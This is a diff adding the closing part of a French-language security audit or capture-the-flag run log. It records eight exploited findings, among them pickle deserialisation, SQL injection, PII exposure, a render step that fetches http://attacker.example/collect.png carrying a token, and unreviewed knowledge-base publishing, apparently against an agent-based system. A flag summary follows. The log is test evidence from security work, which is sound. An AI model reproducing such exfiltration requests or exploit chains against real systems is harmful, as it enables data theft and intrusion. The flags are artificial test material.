@@ -1,0 +1,20 @@
+  requêtes: [{'kind': 'fetch', 'url': 'http://attacker.example/collect.png', 'note': 'CPE{a635d3977ae5}'}]
+  [+] F-07_render: CPE{a635d3977ae5}  (agent.attacker.log[].note)
+
+[F-08] Publication d'un article de base de connaissances sans revue
+  réponse: ingested and published (receipt CPE{742432e989c1})
+  [+] F-08_kb_publish: CPE{742432e989c1}  (reçu de suggest_kb)
+
+
+=== SYNTHÈSE ===
+F-01_pickle          CPE{2367079bdc4a}
+F-02_reset           CPE{b4f97c58a3c7}
+F-03_sqli            CPE{0aad372a5c29}
+F-04_pii             CPE{931a47f29771}
+F-05_kb_acl          CPE{20ce2d28215a}
+F-06_email           CPE{36899ee10e84}
+F-07_render          CPE{a635d3977ae5}
+F-08_kb_publish      CPE{742432e989c1}
+
+8 findings, 8 jetons distincts sur 8 attendus.
+Preuves enregistrées dans audit/evidence/tokens.json
